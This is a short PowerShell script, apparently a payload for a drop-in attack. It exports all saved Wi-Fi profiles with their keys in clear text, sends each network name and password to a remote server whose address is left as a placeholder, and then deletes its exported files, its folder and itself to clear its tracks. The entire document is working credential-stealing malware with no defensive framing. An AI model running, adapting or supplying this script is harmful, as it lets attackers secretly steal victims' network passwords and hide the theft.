# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p


# Get all saved wifi password and send it to the server
$server = "<PROVIDE_SERVER_ADDRESS"
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= $server+"/SSID="+$xml.WLANProfile.SSIDConfig.SSID.name + "?PASS =" +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Invoke-WebRequest -URI $a
}


# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass


# Remove payload
rm d.ps1
